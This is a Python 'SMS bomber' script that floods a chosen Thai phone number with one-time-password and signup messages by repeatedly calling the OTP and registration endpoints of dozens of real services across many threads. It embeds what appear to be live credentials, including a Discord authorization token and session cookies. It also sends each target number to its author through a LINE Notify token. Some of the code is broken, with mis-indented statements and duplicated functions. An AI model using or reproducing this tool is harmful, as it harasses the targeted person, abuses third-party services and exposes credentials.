import requests
import os
import time
import threading
import sys
from threading import Thread
from requests import post,Session
os.system("clear")
print("""
█▀▄ ▄▀▄ █▄░█ █░█ ▀█▀ 
█░█ █░█ █░▀█ █░█ ░█░ 
▀▀░ ░▀░ ▀░░▀ ░▀░ ░▀░ 
 
Spam Sms By : DoNuT

[+FB] : โด นัท
	""")
phone = input("[+] Number : ")
num = int(input("จำนวน : "))
os.system("clear")
print("______________by : donut______________")
print("")
print("________________loading️______________")
print("")

useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print(" Success ✓")
	lineNotify(f" เบอร์ {phone} | จำนวน {num} ")
	
def test2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(" Success ✓")
	
def cang01():
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
    print(" Success ✓")

def cang02():
    requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
    print(" Success ✓")
    
def cang03():
    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
    print(" Success ✓")
   
   
def cang1():
    requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
    print(" Success ✓")
    
    
def cang2():
    requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    print(" Success ✓")
    
def cang3():
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 

print(" Success ✓")

def cang4():
    requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    print(" Success ✓")
    
    
def cang5():
    requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
    print(" Success ✓")
    
def cang6():
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
    print(" Success ✓")

def cang7():
    requests.post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
    print(" Success ✓")
    
def cang8():
    requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
    print(" Success ✓")
    
 
    
def cang9():
   requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
print(" Success ✓")
    
def cang10():
   requests.post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
print(" Success ✓")
    
def cang11():
    post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
        "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
    print(" Success ✓")
    
    
    
    
def cang12():
	requests.post("https://discord.com/api/v9/users/@me/phone",json={
  "phone": "+66"+phone,
  "change_phone_reason": "guild_phone_required"
},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})
print(" Success ✓")



def cang13():
	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
	print(" Success ✓")


def cang13():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print(" Success ✓")
	

def cang14():
	requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
	print(" Success ✓")
	
def cang15():
	print(" Success ✓")
	requests.post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,

"retrycount":"0"

    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
    
def cang16():
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    print(" Success ✓")
    
    

def sck():
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    print(" Success ✓")
    
    
def cang19():
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print(" Success ✓")
    
    
def cang20():
	requests.post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone,
	})
	print(" Success ✓")

	
def cang21():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(" Success ✓")

    
def cang22():
	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
	print(" Success ✓")
	
def cang23():
	 requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
	 print(" Success ✓")
	 
def cang24():
	requests.get("https://findclone.ru/register?phone=+66"+phone)
	print(" Success ✓")
	
def cang25():
	requests.post("https://queenclub88.com/api/register/phone", data={"phone":phone})
	print(" Success ✓")
def cang26():
	requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
	print(" Success ✓")
	
def cang27():
	requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})
	print(" Success ✓")
	
def cang28():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "accept": "*/*",
	    "referer": "https://ufa108.ufabetcash.com/register.php",
	    "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
	    }
	requests.post("https://ufa108.ufabetcash.com/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")
	print(" Success ✓")
	
def cang29():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://www.pruksa.com/member/register/otp_code",
	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
	    }
	requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")
	print(" Success ✓")
	
def cang31():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	print(" Success ✓")
	
def cang32():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print(" Success ✓")
	
def cang33():
	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	print(" Success ✓")
	
def cang34():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	print(" Success ✓")
	
def cang35():
	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
	print(" Success ✓")
	
def cang36():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
	print(" Success ✓")
	
def cang37():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print(" Success ✓")
	
def cang38():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print(" Success ✓")
	
def cang39():
	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
	print(" Success ✓")
	
def cang40():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print(" Success ✓")
	
def cang41():
	post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print(" Success ✓")
    
def cang41(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print(" Success ✓")
	
def cang42():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print(" Success ✓")


    
for i in range(num):
	time.sleep(1)
	threading.Thread(target=test).start()
	threading.Thread(target=test2).start()
	threading.Thread(target=cang01).start()
	threading.Thread(target=cang02).start()
	threading.Thread(target=cang03).start()
	threading.Thread(target=cang1).start()
	threading.Thread(target=cang2).start()
	threading.Thread(target=cang3).start()
	threading.Thread(target=cang4).start()
	threading.Thread(target=cang5).start()
	threading.Thread(target=cang6).start()
	threading.Thread(target=cang7).start()
	threading.Thread(target=cang8).start()
	threading.Thread(target=cang9).start()
	threading.Thread(target=cang10).start()
	threading.Thread(target=cang11).start()
	threading.Thread(target=cang12).start()
	threading.Thread(target=cang13).start()
	threading.Thread(target=cang14).start()
	threading.Thread(target=cang16).start()
	threading.Thread(target=cang19).start()
	threading.Thread(target=cang20).start()
	threading.Thread(target=cang21).start()
	threading.Thread(target=cang22).start()
	threading.Thread(target=cang23).start()
	threading.Thread(target=cang24).start()
	threading.Thread(target=cang25).start()
	threading.Thread(target=cang26).start()
	threading.Thread(target=cang27).start()
	threading.Thread(target=cang28).start()
	threading.Thread(target=cang29).start()
	threading.Thread(target=cang31).start()
	threading.Thread(target=cang32).start()
	threading.Thread(target=cang33).start()
	threading.Thread(target=cang34).start()
	threading.Thread(target=cang35).start()
	threading.Thread(target=cang36).start()
	threading.Thread(target=cang37).start()
	threading.Thread(target=cang38).start()
	threading.Thread(target=cang39).start()
	threading.Thread(target=cang40).start()
	threading.Thread(target=cang41).start()
	threading.Thread(target=cang42).start()

    
token = '05rwFXsCPJ4MbM2Bick1FWwuXCCqchFtLiSk2lkcmMP'

def _lineNotify(payload,file=None):
    import requests
    url = 'https://notify-api.line.me/api/notify'
    headers = {'Authorization':'Bearer '+token}
    return requests.post(url, headers=headers , data = payload, files=file)
    
def lineNotify(message):
    payload = {'message':message}
    return _lineNotify(payload)
